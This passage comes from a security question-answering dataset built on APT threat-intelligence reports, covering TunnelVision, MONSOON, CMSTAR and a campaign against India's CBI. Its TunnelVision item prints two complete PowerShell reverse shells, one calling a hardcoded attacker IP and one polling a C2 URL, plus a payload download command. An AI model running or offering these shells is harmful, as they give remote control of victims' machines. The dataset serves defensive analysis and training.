    "output": "The attackers leveraged seemingly legitimate registration information and domain names to evade detection by registering domains that appeared less suspicious to targets. For example, they used domains like 'nateon' and 'alyac' in callback domains, and registered domains such as 'alyac.org' and 'trendmicros.net' with legitimate-sounding names. Additionally, they reused infrastructure and set low TTL values for DNS records to facilitate rapid changes in command and control servers. To counteract these tactics, network defenders should be wary of domains that appear legitimate but are not, such as slight variations of well-known domains. They should also review blacklists periodically to ensure they are not blocking legitimate business unnecessarily and consider using whitelists, while being aware that even whitelisted sites can be compromised. Continual reassessment of trust relationships on the internet is crucial, as these relationships can be exploited for malicious purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: VMware Horizon Exploitation\nThe exploitation of Log4j in VMware Horizon is characterized by a malicious process spawned from the Tomcat service of the VMware product ( C:\\Program Files\\VMware\\VMware View\\Server\\bin\\ws_TomcatService.exe ).\nTunnelVision attackers have been actively exploiting the vulnerability to run malicious PowerShell commands, deploy backdoors, create backdoor users, harvest credentials and perform lateral movement.\nTypically, the threat actor initially exploits the Log4j vulnerability to run PowerShell commands directly, and then runs further commands by means of PS reverse shells, executed via the Tomcat process.\nBig Headline: PowerShell Commands\nTunnelVision operators exploited the Log4j vulnerability in VMware Horizon to run PowerShell commands, sending outputs back utilizing a webhook. In this example, the threat actor attempted to download (<https://ngrok.com/>)ngrok to a compromised VMware Horizon server:\ntry{\n(New-Object\nSystem.Net.WebClient).DownloadFile(\"hxxp://transfer.sh/uSeOFn/ngrok.exe\",\"C:\\\\Users\\Pu\nThroughout the activity the usage of multiple legitimate services was observed. Given an environment is compromised by TunnelVision, it might be helpful to look for outbound connections to any of those legitimate public services:\ntransfer.sh\npastebin.com\nwebhook.site\nufile.io\nraw.githubusercontent.com\nBig Headline: Reverse Shell #1\n$c = \"\" $p = \"\" $r = \"\" $u = \"hxxps://www.microsoft-updateserver.cf/gadfTs55sghsSSS\" $wc = New-Object System.Net.WebClient $li = (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]; $c = \"whoami\" $c = 'Write-Host \" \";'+$c $r = &(gcm *ke-e*) $c | Out-String > \"c:\\programdata\\$env:COMPUTERNAME-$li\" $ur = $wc.UploadFile(\"$u/phppost.php\" , \"c:\\programdata\\$env:COMPUTERNAME-$li\") while($true) { $c = $wc.DownloadString(\"$u/$env:COMPUTERNAME-$li/123.txt\") $c = 'Write-Host \" \";'+$c if($c -ne $p) { $r = &(gcm *ke-e*) $c | Out-String > \"c:\\programdata\\$env:COMPUTERNAME-$li\" $p = $c $ur = $wc.UploadFile(\"$u/phppost.php\" , \"c:\\programdata\\$env:COMPUTERNAME-$li\") } sleep 3 }\nReverse Shell #1 was used in the past by TunnelVision operators (7feb4d36a33f43d7a1bb254e425ccd458d3ea921), utilizing a different C2 server: \"hxxp://google.onedriver-srv.ml/gadfTs55sghsSSS\". This C2 was referenced in several  analyzing TunnelVision activities.\nThroughout the activity the threat actor leveraged another domain, service-management[.]tk , used to host malicious payloads. According to VirusTotal, this domain was also used to host a zip file (d28e07d2722f771bd31c9ff90b9c64d4a188435a) containing a custom backdoor (624278ed3019a42131a3a3f6e0e2aac8d8c8b438).\nThe backdoor drops an additional executable file (e76e9237c49e7598f2b3f94a2b52b01002f8e862) to %ProgramData%\\Installed Packages\\InteropServices.exe and registers it as a service named \"InteropServices\".\nThe dropped executable contains an obfuscated version of the reverse shell as described above, beaconing to the same C2 server ( www[.]microsoft-updateserver[.]cf ). Although it is not encrypted, it is deobfuscated and executed in a somewhat similar manner to how PowerLess, another  used by the group, executes its PowerShell payload.\nBig Headline: Reverse Shell #2\n$hst = \"51.89.135.142\";\n$prt = 443;\nfunction watcher() {; $limit = (Get - Random - Minimum 3 - Maximum 7); $stopWatch = New - Object - TypeName System.Diagnostics.Stopwatch; $timeSpan = New - TimeSpan - Seconds $limit; $stopWatch.Start(); while ((($stopWatch.Elapsed).TotalSeconds - lt $timeSpan.TotalSeconds) ) {}; $stopWatch.Stop(); }; watcher; $arr = New - Object int[] 500; for ($i = 0; $i - lt 99; $i++) {; $arr[$i] = (Get - Random - Minimum 1 - Maximum 25); }; if ($arr[0] - gt 0) {; $valksdhfg = New - Object System.Net.Sockets.TCPClient($hst, $prt); $banljsdfn = $valksdhfg.GetStream(); [byte[]]$bytes = 0..65535|% { 0 }; while (($i = $banljsdfn.Read($bytes, 0, $bytes.Length)) - ne 0) {; $lkjnsdffaa = (New - Object - TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $nsdfgsahjxx = (&(gcm('*ke-exp*')) $lkjnsdffaa 2 > &1 | Out - String ); $nsdfgsahjxx2 = $nsdfgsahjxx + (pwd).Path + \"> \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($nsdfgsahjxx2); $banljsdfn.Write($sendbyte, 0, $sendbyte.Length); $banljsdfn.Flush(); watcher }; $valksdhfg.Close(); };\nMost of the \"online\" activities we observed were performed from this PowerShell backdoor. It seems to be a modified variant of a (<https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1>)publicly available PowerShell one-liner.\nAmong those activities were:\nExecution of recon commands.\nCreation of a backdoor user and adding it to the administrators group.\nCredential harvesting using Procdump, SAM hive dumps and comsvcs MiniDump.\nDownload and execution of tunneling tools, including Plink and Ngrok, used to tunnel RDP traffic.\nExecution of a reverse shell utilizing VMware Horizon NodeJS component[,].\nInternal subnet RDP scan using a (<https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/port-scan-tcp.ps1>)publicly available port scan script.\nThroughout the activity, the threat actor utilized a github repository \"VmWareHorizon\" of an account owned by the threat actor, using the name \"protections20\".\nBig Headline: Attribution\nTunnelVision activities have been discussed previously and are tracked by other vendors under a variety of names, such as Phosphorus (Microsoft) and, confusingly, either Charming Kitten or Nemesis Kitten (CrowdStrike).\nThis confusion arises since activity that Microsoft recognizes as a single group, \"Phosphorous\", overlaps with activity that CrowdStrike distinguishes as belonging to two different actors, Charming Kitten and Nemesis Kitten.\nWe track this cluster separately under the name \"TunnelVision\". This does not imply we believe they are necessarily unrelated, only that there is at present insufficient data to treat them as identical to any of the aforementioned attributions.\nQuestion: What techniques did TunnelVision use to establish reverse shells, and how did they leverage these shells for further activities?",
    "output": "Answer: TunnelVision used multiple reverse shell techniques to maintain persistence and control over compromised systems. One reverse shell script utilized a C2 server hosted at 'hxxps://www.microsoft-updateserver.cf/gadfTs55sghsSSS'. This script continuously checked for new commands from the C2 server and executed them, uploading the results back to the server. Another reverse shell was a modified variant of a publicly available PowerShell one-liner, which connected to a hardcoded IP address and port (51.89.135.142:443). Through these reverse shells, TunnelVision performed various activities such as executing recon commands, creating backdoor users, harvesting credentials, downloading and executing tunneling tools like Plink and Ngrok, and scanning internal subnets for RDP services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Does APT41 use phishing as a tactic to gain access to victim systems, and if so, how does it relate to their supply chain compromises?",
    "output": "Phishing is a type of social engineering attack where adversaries send electronically delivered messages to gain access to victim systems. APT41, a Chinese cyber espionage group, has been known to use various tactics to gain access to victim systems, including supply chain compromises. While the #Given Context# does not explicitly mention phishing as a tactic used by APT41, it does mention that 'supply chain targeting requires more effort than typically observed mass targeting methods, such as establishing a strategic web compromise (SWC) or conducting large spear-phishing campaigns.' This suggests that APT41 may use phishing as a tactic to gain access to victim systems, particularly in the context of supply chain compromises. Furthermore, the #Phishing Description# mentions that adversaries may send phishing messages to gain access to victim systems, and that phishing can be targeted, known as spearphishing. Given APT41's history of supply chain compromises, it is likely that they use phishing as a tactic to gain access to victim systems, particularly in the context of targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the use of key files in PIVY samples by the Molerats group enhance the attribution of related attacks, and what implications does this have for cybersecurity professionals?",
    "output": "The use of key files in PIVY samples by the Molerats group enhances the attribution of related attacks because it provides a unique identifier that can be tracked across multiple incidents. Unlike the default password 'admin', custom key files contain specific strings that are less likely to be coincidentally reused by unrelated actors. For example, the sample with MD5 hash 9dff139bbbe476770294fb86f4e156ac used a key file containing the ascii string 'Password (256 bits):\\\\x0d\\\\x0aA9612889F6'. This unique key file can be used to link different attacks to the same threat actor. The implication for cybersecurity professionals is that they can leverage these key files to track and attribute attacks more effectively, improving their ability to defend against and respond to threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: UNKNOWN LOGGER PUBLIC V 1.5\nUnknown Logger is another malware component used in MONSOON. It is a publicly released, free backdoor. It is capable of credential theft from browsers, keylogging, taking screenshots, spreading itself laterally, and downloading second stage malware.\nIn 2012, a user named \"The Unknown\" publicly released a free version of a credential stealing worm on hackforums[.net] called \"Unknown Logger Public\". The actors have been using version 1.5 of this malware in some of their weaponised documents. It is likely that they simply downloaded and built their own version from the publicly available version 1.5 on Hackforums.\nUnknown Logger is dropped by at least two 15 of the weaponised documents analysed. Both of these documents exploit CVE-2014-6352.\n15 SHA1: 824013c9d8b2aab1396c4a50579f8bd4bf80abdb SHA1: e27d3cfc9141f618c5a8c075e7d18af11a012710\nSmall Headline: Forcepoint\u2122 Security Labs\u2122 | Special Investigations\nUnknown Logger's main purpose is to record keystrokes and steal usernames and passwords saved by browsers on the local machine. This information is then sent to a pre-defined FTP or SMTP server with a username and password specified by the actor when building the malware. It can also spread itself into RAR files, USB devices and network shares. Interestingly it does not have the ability for C&C communication. It cannot execute arbitrary commands or receive a command indicating what it should do next.\nSmall Headline: Features:\n1- Built in Stub\n2- Get Tons of Information about the slave (Computer User, Computer Name, Computer Total Physical Memory, slave's IP Address, slave's Country, Date, etc...)\n3- Send logs to SMTP Severs and FTP\n4- SMTP (Hotmail, Gmail, AOL, Yahoo)\n5- Test Mail Functionality (Hotmail, Gmail, AOL, Yahoo)\n6- Test FTP Functionality\n7- Continuously Send Logs without Fail\n8- Custom Logs Sending Interval (Which means you Choose when the Logs are sent to you)\n9- Logs Every Single Thing on the Keyboard (Letters(Up Cases and Low Cases) - Numbers - Symbols - Specific Keys ([F1], [F2], [Home], etc...))\n10- Works on all Operating Systems (Window XP, Window Vista, Window 7 (32 and 64 bit)\n11- Hide Functionality (Make the Server Invisible to the Naked eye)\n12- Never Crashes in slave's Computer (Will always be working whatever happens)\n13- Simple and Easy to use GUI\n14- Customer Server Name\n15- Sends Clean and Very Organized Logs\n16- Can be Used as a Keylogger - Stealer - Worm - Spreader and more by just Checking Few Boxes\nMedium Headline: Forcepoint\u2122 Security Labs\u2122 | Special Investigations\nConfiguration. In the samples analysed16 ,\nUnknown Logger was configured to download the AutoIt backdoor upon start-up. One of configurations was as follows:\n16 SHA1: c691c07191963ca3db28235d0a38060b2b9ea8f2 SHA1: 6e85333e5ee05c40bee0457419aa68a007a0e5f5\nMONSOON \u2013 ANALYSIS OF AN APT CAMPAIGN\nRevision: 1.07 | TLP-WHITE | 40/57\nFigure 35 \u2013 Unknown Logger Configuration\nThe settings have been named as part of the investigation as they are not specifically named in the malware. The \"DownloadExecFileURL\" specifies a URL to grab an additional file from and execute it at runtime. Analysis found that nregsrv2.exe is the same AutoIt trojan dropped by many of the other weaponised documents used in this campaign.\nMedium Headline: TINYTYPHON\nThe TINYTYPHON malware is a small backdoor capable of finding and uploading documents on locally mapped drives and receiving secondary malware. It is dropped by at least one of the weaponised documents17 used in the MONSOON campaign where it is embedded inside another executable. The majority of the code for TINYTYPHON is taken from the MyDoom worm and has been repurposed to find and exfiltrate documents.\nConfiguration & Persistence. TINYTYPHON contains a small configuration appended to the end of the executable. In the sample analysed18 this configuration was XORed with the hexadecimal value 0x90.\n17 SHA1:\n9cdbb41f83854ea4827c83ad9809ed0210566fbc\n18 SHA1:\nfcf8e5cf1207fdfab9bcb0a4dc45ad188089655a\nMONSOON \u2013 ANALYSIS OF AN APT CAMPAIGN\nRevision: 1.07 | TLP-WHITE | 41/57\nThe configuration contains the C&C address and paths to use as well as a list of document extensions to check when crawling local drives. It also contains the filename to copy itself to in the local system32 directory, and the name of the persistence registry key to install itself under HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\nDocument Crawler. TINYTYPHON constantly searches for and uploads documents on the local machine. It will first search for any documents on the drive containing the operating system, and then it will search through all drive letters C through to Z.\nOnce a document is found matching one of the extensions in the configuration, the document is uploaded to the C&C.\nVictims. The TINYTYPHON C&C from the sample we analysed contained a /http directory which had an open directory listing:\nThe /upload directory contained several folders relating to different victims:\nEach of these folders contained the documents found and uploaded by TINYTYPHON on the victim's machine.\nThe filenames begin with the MD5 hash of the file, then a dash, and then the original filename. There were thousands of documents which had been exfiltrated to this C&C.\nAfter reviewing the filenames of documents from several of the victims, it appears as though most of the victims are involved with government agencies. Some of these documents contain highly sensitive information such as clearance documents, financial information, and technical specifications.\nDuring the investigation, the server stopped responding on June 8, 2016 and then came back online on July 5, 2016. It is unknown why this month long outage occurred, although it could have been because the group knew that people were accessing the open directories and wanted to remain undetected.\nMedium Headline: VICTIMS\nThe MONSOON victims fit with a group who have military and political interests in the Indian Subcontinent. Many of the victims are located in surrounding countries including Bangladesh, Sri Lanka and Pakistan. But victims also originate from further afield, including Africa and the Far East. The targeting of Chinese nationals may also be related to this campaign, but equally may be part of a separate campaign by the adversary or even as part of them selling Surveillance-As-A-Service in a similar manner previously seen with the HANGOVER group [2].\nMedium Headline: ADVERSARIES\nIt was possible to identify an individual from a domain registration record who is believed to be associated with MONSOON. There is a highly probable level of confidence in this association due to the following reasons:\n\uf0b7 The domain name registered is a variant of one of the most popular domains used in MONSOON\n\uf0b7 The person who registered the domain lives or has lived and works in India\n\uf0b7 The person who registered the domain has profiles on coding challenge and freelance coder websites. The HANGOVER group are thought to use freelance coders.\nFrom the information available, it was possible to identify this individual's Facebook and LinkedIn accounts. However, it is not deemed in the public interest to publish specific details on this individual. Relevant authorities are informed as and when appropriate.\nCui Bono? A useful analysis viewpoint is to ask the legal question: Cui Bono? Or: \"who profits?\"\nEven though this report does not attempt to focus on specific attribution, asking \"What is to be gained from these actions or what needs are satisfied?\" may offers some insight. Any further analysis is left as an exercise to for reader.\nFrom the documents known to have been exfiltrated, a number of recurring themes occur:\n\uf0b7 Army training, personnel and payroll records\n\uf0b7 Defence attaches and consulates\n\uf0b7 Defence research\n\uf0b7 Foreign high commissions\n\uf0b7 Military exercises\n\uf0b7 Military air platforms\n\uf0b7 Military naval platforms\n\uf0b7 Military logistic records\n\uf0b7 Naval coastal protection\n\uf0b7 Anti-torpedo and naval electronic countermeasure (ECM) systems.\n\uf0b7 Submarine communication systems\n\uf0b7 Nuclear security and counter proliferation\n\uf0b7 United Nations\n\uf0b7 Personal details including medical records, driving license, passport and visas\n\uf0b7 Accounting records\n\uf0b7 Travel and itinerary details\nMedium Headline: INFRASTRUCTURE\nBy integrating the findings with prior research [1] [8], it was possible to connect MONSOON directly with infrastructure used by the HANGOVER group via a series of strong connections. The original HANGOVER infrastructure overlaps with unique passive DNS records and is further linked by the use of a specific SOA RNAME record.\nAn example of this connection is illustrated below.\nBoth of the IPs that link this infrastructure appear to be unique to the Hangover group. The newsnstat[.com] domain was used earlier in 2015 for previous HANGOVER campaigns, and was then repurposed in December 2015 for the MONSOON campaign.\n\nHow does the Unknown Logger Public v1.5 malware, used in the MONSOON campaign, achieve its primary objectives of credential theft and data exfiltration?",
    "output": "Unknown Logger Public v1.5 achieves its primary objectives through several methods. It records keystrokes to capture user input, steals usernames and passwords saved by web browsers on the local machine, and sends this information to a pre-defined FTP or SMTP server. Additionally, it can spread itself into RAR files, USB devices, and network shares. However, it lacks command-and-control (C&C) communication capabilities, meaning it cannot execute arbitrary commands or receive instructions from a remote server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What was the timeline and nature of the cyberattacks on Georgia in 2008, and how did they correlate with the Russian invasion?",
    "output": "The cyberattacks on Georgia began in the weeks leading up to the Russian invasion in August 2008 and continued even after the Kremlin announced a ceasefire on 12 August. The attacks included DDoS assaults and the defacement of key government websites, such as the website of President Mikheil Saakashvili. These attacks aimed to disrupt Georgia's ability to communicate with its citizens and the international media during the conflict. The first major attack occurred on 20 July when the website of the President of Georgia was rendered unavailable due to a DDoS attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Cyber Attack Impersonating Identity of Indian Think Tank to Target Central Bureau of Investigation (CBI) and Possibly Indian Army Officials\n5/11/2017\nIn my previous blog posts I posted details of cyber attacks targeting (<https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/>)Indian Ministry of External Affairs and (<https://cysinfo.com/cyber-attack-targeting-indian-navys-submarine-warship-manufacturer/>)Indian Navy's Warship and Submarine Manufacturer. This blog post describes another attack campaign where attackers impersonated identity of Indian think tank (<https://en.wikipedia.org/wiki/Institute_for_Defence_Studies_and_Analyses>)IDSA (Institute for Defence Studies and Analyses) and sent out spear-phishing emails to target officials of the Central Bureau of Investigation (CBI) and possibly the officials of\nBig Headline: Indian Army.\nThe (<https://en.wikipedia.org/wiki/Central_Bureau_of_Investigation>)Central Bureau of Investigation (CBI) is the domestic intelligence and security service of India and serves as the India's premier investigative and Interpol agency operating under the jurisdiction of the Government of India.\nIn order to infect the victims, the attackers distributed spear-phishing emails containing malicious excel file which when opened dropped a malware capable of downloading additional components and spying on infected systems. To distribute the malicious excel file, the attackers registered a domain which impersonated the identity of most influential Indian think tank (<https://en.wikipedia.org/wiki/Institute_for_Defence_Studies_and_Analyses>)IDSA (Institute for Defence Studies and Analyses) and used the email id from the impersonating domain to send out the spear-phishing emails to the victims.\nMedium Headline: Anti-Analysis Techniques in the Malicious Excel File\nWhen the victim opens the attached excel file it prompts the user to enable macro content as shown in the below\nscreen shot.\nTo prevent viewing of the macro code and to make manual analysis harder attackers password protected the macro content as show below.\nEven though the macro is password protected, It is possible to extract macro code using analysis tools like (<https://www.decalage.info/python/oletools>)oletools. In this case oletools was used to extract the macro content but it turns out that the oletools was able to extract only partial macro content but it failed to extract the malicious content present inside a Textbox within the Userform. Below screen shot shows the macro content extracted by the oletools.\nThis extracted macro content was copied to new excel workbook and the environment was setup to debug the macro code. Debugging the macro code failed because the macro code accesses the textbox content within the UserForm (which oletools failed to extract). The technique of storing the malicious content inside the TextBox within the UserForm allowed the attackers to bypass analysis tools. Below screen shot shows the macro code accessing the content from the TextBox and the error triggered by the code due to the absence of the TextBox content.\nTo bypass the anti-analysis technique and to extract the content stored in the TextBox within the UserForm the password protection was bypassed which allowed to extract the content stored within the UserForm. Below screen shot shows the TextBox content stored within the UserForm.\nAt this point all the components (macro code and the UserForm content) required for analysis was extracted and an environment similar to the original excel file was created to debug the malicious macro. Below screen shots show the new excel file containing extracted macro code and the UserForm content.\nMedium Headline: Analysis of Malicious Excel File\nWhen the victim opens the excel file and enables the macro content, The malicious macro code within the excel file is executed. The macro code first generates a random filename as shown in the below screen shot.\nIt then reads the executable content stored in the TextBox within the UserForm and then writes the executable content to the randomly generate filename in the %AppData% directory. The executable is written in .NET framework\nThe content stored in the TexBox within the UserForm is an executable content in the decimal format. Below screen shot shows converted data from decimal to text. In this case the attackers used the TextBox within the UserForm to store the malicious executable content.\nBig Headline: Input:\nThe dropped file in the %AppData% directory is then executed as shown in the below screen shot.\nOnce the dropped file is executed it copies itself into %AppData%\\SQLite directory as SQLite.exe and executes as shown below.\nAs a result of executing SQLite.exe it makes a HTTP connection to the C2 server (qhavcloud[.]com). The C2 communication shown below contains a hard coded user-agent and the double slash (//) in the GET request this can be used to create network based signatures.\nSmall Headline: a) Malware Validates C2 Connection\nMalware checks if the executable is running as SQLite.exe from %AppData%\\SQLite directory, if not it copies itself as SQLite.exe to %AppData%\\SQLite directory as shown below.\nIt then launches the executable (SQLite.exe) with the command line arguments as shown in the below screen shots.\nMalware performs multiple checks to make sure that it is connecting to the correct C2 server before doing anything malicious. first its pings the C2 domain qhavcloud[.]com. Below screen shots show the ping to the C2 server.\nIf the ping succeeds then it determines if C2 server is alive by sending an HTTP request, it then reads the content from the C2 server and looks for a specific string \"Connection!\". If it does not find the string \"Connection!\" it assumes that C2 is not alive or it is connecting to the wrong C2 server. This technique allows the attackers to validate if they are connecting to the correct C2 server and also this technique does not reveal any malicious behavior in dynamic/sandbox analysis until the correct response is given to the malware. Below screen shots show the code that is performing the C2 connection and the validation.\nIf the ping does not succeed or if the C2 response does not contain the string \"Connection!\" then the malware gets\nthe list of backup C2 servers to connect by downloading a text file from the Google drive link. This technique of storing a text file containing the list of backup C2 servers on the legitimate site has advantages and it is highly unlikely to trigger any suspicion in security monitoring and also can bypass reputation based devices. Below screen shots show the code that downloads the text file and text file (info.txt) saved on the disk.\nDuring the time of analysis the text file downloaded from the Google drive link was populated with two private IP addresses, it looks like the attackers deliberately populated the IP addresses with two private IP addresses to prevent the researchers from determining actual IP/domain names of the backup C2 servers. Below screen shot shows the IP addresses in the text file.\nOnce the text file is downloaded the malware reads each and every IP address from the text file and performs the same C2 validation check (ping and checks for the string \"Connection!\" from the C2 response). Below screen shot shows the HTTP connection made to those IP addresses.\nSmall Headline: b) Malware Sends System Information\nBased on the analysis it was determined that the malware looks for a string \"Connection!\" in the C2 response, so the analysis environment was configured to respond with a string \"Connection!\" whenever the malware made a C2 connection. Below screen shot shows the C2 communication made by the malware and the expected response.\nOnce the malware validates the C2 connection then the malware creates an XML file (SQLite.xml) inside which it stores the user name and the password to communicate with the C2 server. Malware generates the user name to communicate with the C2 by concatenating a) the machine name, b) a random number between 1000 to 9999 and c) the product version of the file. Below screen shot shows the code that generates the user name\nMalware generates the password to communicate with the C2 by building an array of 16 random bytes, these random bytes are then encoded using base64 encoding algorithm and malware then replaces the characters \"+\" and\n\"/\" with \"-\" and \"_\" respectively from the encoded data. The attackers use the technique of replacing the standard characters with custom characters to makes it difficult to decode the string (containing the characters \"+\" and \"/\") using standard base64 algorithm. Below screen shot shows the code that generates the password.\nOnce the user name and password is generated, malware then creates an XML file (SQLITE.xml) and populates the XML file with the generated user name and password. Below screen shot shows the code that creates the XML file\nBelow screen shot shows the XML file populated with the user name and the password which is used by the malware to communicate with the C2 server.\nThe malware then collects system information like the computer name, operating system caption, IP address of the infected system, product version of the executable file and sends it to the C2 server along with the generated user\nname and password using a POST request to postdata.php. Below screen shots show the code that collects the system information and the data that is sent to the attacker.\n\nQ: How does the malware generate the username and password for communicating with the C2 server, and what system information does it collect and send to the attacker?",
    "output": "A: The malware generates the username by concatenating the machine name, a random number between 1000 and 9999, and the product version of the file. It generates the password by building an array of 16 random bytes, encoding them using base64, and replacing the characters '+' and '/' with '-' and '_', respectively. The malware then creates an XML file (SQLITE.xml) containing the username and password. It collects system information such as the computer name, operating system caption, IP address of the infected system, and product version of the executable file, and sends this information to the C2 server along with the generated username and password using a POST request to postdata.php.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Phishing Emails\nBetween June and August of this year, we observed a total of 20 unique emails being sent to the following email addresses:\nThese emails contained a series of subject lines, primarily revolving around the topic of \u0417\u0430\u043f\u0430\u0434-2017 ( (<https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BF%D0%B0%D0%B4-2017>)'West-2017'), also known in English as (<https://en.wikipedia.org/wiki/Zapad_2017_exercise>)Zapad 2017. Zapad 2017 was a series of joint military exercises conducted by the Armed Forces of the Russian Federation and the Republic of Belarus, held from September 14th to 20th in 2017.\nThe full list of subject lines is as follows:\nFwd:\u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430 \u043a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: Fwd:Preparing for the West-2017]\n\u0432\u044b\u043f\u0443\u0441\u043a \u0432\u043e\u0441\u043f\u0438\u0442\u0430\u043d\u043d\u0438\u043a\u043e\u0432 [Translation: graduation]\n\u041a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: To West-2017]\n\u0417\u0430\u043f\u0430\u0434-2017 [Translation: West-2017]\nAn example of some of the previously mentioned emails may be seen below.\nBig Headline: Decoy Documents\nWe observed that the attachments used in these emails contained a mixture of file types. RTF documents, Microsoft Word documents, and a RAR archive. The RAR archive contained a series of images, a decoy document, and a Microsoft Windows executable within it. The executable has a .scr file extension, and is designed to look like a Windows folder, as seen below:\nThe rough translation of the folder and file names above are 'Preparations for large-scale West-2017 exercises in this format are being held for the first time.' Within the actual folder, there are a series of JPG images, as well as a decoy document with a title that is translated to 'Thousands of Russian and Belarusian military are involved in the training of the rear services.'\nThe decoy document contains the following content:\nThe other RTF and Word documents used additional decoy documents, which can be seen below.\nWhile we observed different techniques being used for delivery, all attachments executed a variant of the CMSTAR malware family. We observed minor changes between variants, which we discuss in the CMSTAR Variations and Payloads section of the blog post.\nThe Word documents, which we track as Werow, employ malicious macros for their delivery. More information about these macros may be found in the Appendix of the blog post. Additionally, we have included a script that extracts these embedded payloads that can also be found in the Appendix.\nThe RTF documents made use of (<https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641>)CVE-2015-1641. This vulnerability, patched in 2015, allows attackers to execute malicious code when these specially crafted documents are opened within vulnerable instances of Microsoft Word. The payload for these samples is embedded within them and obfuscated using a 4-byte XOR key of 0xCAFEBABE. We have included a script that can be used to extract the underlying payload of these RTFs statically that can be found in the Appendix.\nThe SCR file mentioned previously drops a CMSTAR DLL and runs it via an external call to rundll32.exe.\nBig Headline: CMSTAR Variations and Payloads\nIn total, we observed three variations of CMSTAR in these recent attacks against Belarusian targets. The biggest change observed between them looks to be minor modifications made to the string obfuscation routine. A very simple modification to the digit used in subtraction was modified between the variants, as shown below:\nThe older variation, named CMSTAR.A, was discussed in a previous blog post entitled, \"(<https://researchcenter.paloaltonetworks.com/2016/03/digital-quartermaster-scenario-demonstrated-in-attacks-against-the-mongolian-government/>)Digital Quartermaster Scenario Demonstrated in Attacks Against the Mongolian Government .\"\nThe CMSTAR.B variant was witnessed using both a different mutex from CMSTAR.A, as well as a slightly modified string obfuscation routine. The mutexes used by CMSTAR ensure that only one instance of the malware runs at a time. The CMSTAR.C variant used the same mutex as CMSTAR.B, however, again used another slightly modified string obfuscation routine. We found all CMSTAR variants using the same obfuscation routine when I payload was downloaded from a remote server. We have included a tool to extract mutex and C2 information from all three CMSTAR variants, as well as a tool to decode the downloaded payload: both may be found in the Scripts section.\nAn example of CMSTAR downloading its payload may be found below:\nWhen expanding the research to identify additional CMSTAR.B and CMSTAR.C variants, we identified a total of 31 samples. Of these 31 samples, we found two unique payloads served from three of the C2 URLS\u2014One of which was downloaded from a sample found in the phishing attacks previously described. Both payloads contained previously unknown malware families. We have named the payload found in the email campaign PYLOT, and the malware downloaded from the additional CMSTAR samples BYEBY.\nBoth malware families acted as backdoors, allowing the attackers to execute commands on the victim machine, as well as a series of other functions. More information about these individual malware families may be found in the appendix.\nBig Headline: Conclusion\nDuring the course of this research, we identified a phishing campaign consisting of 20 unique emails targeting the government of Belarus. The ploys used in these email and decoy documents revolved around a joint strategic military exercise of the Armed Forces of the Russian Federation and the Republic of Belarus, which took place between September 14th and September 20th of this year. While looking at the emails in question, we observed two new variants of the CMSTAR malware family. Between the samples identified and others we found while expanding our research scope, we identified two previously unknown malware families.\nPalo Alto customers are protected from this threat in the following ways:\nTags have been created in AutoFocus to track (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.Cmstar>)CMSTAR, (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.BYEBY>)BYEBY, and (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.PYLOT>)PYLOT\nAll observed samples are identified as malicious in WildFire\nDomains observed to act as C2s have been flagged as malicious\nTraps 4.1 identifies and blocks the CVE-2015-1641 exploit used in these documents\nTraps 4.1 blocks the macros used in the malicious Word documents\nA special thanks to Tom Lancaster for his assistance on this research.\nMedium Headline: Werow Macro Analysis\nThe attacker used the same macro dropper all of the observed Microsoft Word documents we analyzed for this campaign. It begins by building the following path strings:\n%APPDATA%\\d.doc\n%APPDATA%\\Microsoft\\Office\\WinCred.acl\nThe 'd.doc' path will be used to store a copy of the Word document, while the 'WinCred.acl' will contain the dropped payload, which is expected to be a DLL.\nWerow uses rudimentary obfuscation to hide and re-assemble the following strings:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinCred\nrundll32 %APPDATA%\\Microsof\\Office\\WinCred.acl ,WinCred\nThese strings will be used at the end of the macro's execution to ensure persistence via the Run registry key.\nThe malware proceeds to read an included overlay within the original Word document from a given offset. This data is decoded using and XOR operation, as well as an addition operation. It can be represented in Python as follows:\nOnce this overlay is decoded, it is written to the 'WinCred.acl' file and loaded with the 'WinCred' export. A script has been provided in the Scripts section that, in conjunction with oletools, can statically extract the embedded DLL payload from these documents.\nMedium Headline: RTF Shellcode Analysis\nThe RTF documents delivered in this attack campaign appear to be created by the same builder. All of the RTF files attempt to exploit CVE-2015-1641 to execute shellcode on the targeted system. Please reference https://technet.microsoft.com/en-us/library/security/ms15-033.aspx for more information.\nThe shellcode executed after successful exploitation begins by resolving the API functions it requires by enumerating the API functions within loaded modules in the current process. It then builds the following list of values:\nThe shellcode then enumerates the API functions, subjects them to a ROR7 hashing routine and XORs the resulting hash with 0x10ADBEEF. It uses the result of this arithmetic to compare with the list of values above to find the API functions it requires to carry out its functionality.\nSmall Headline: ROR7 ROR7^0x10ADBEEF API Func\nAfter resolving the API functions, the shellcode then begins searching for the embedded payload and decoy within the initial RTF file. It does so by searching the RTF file for three delimiters, specifically 0xBABABABABABA, 0xBBBBBBBB and 0xBCBCBCBC, which the shellcode uses to find the encrypted payload and decoy. The shellcode then decrypts the payload by XOR'ing four 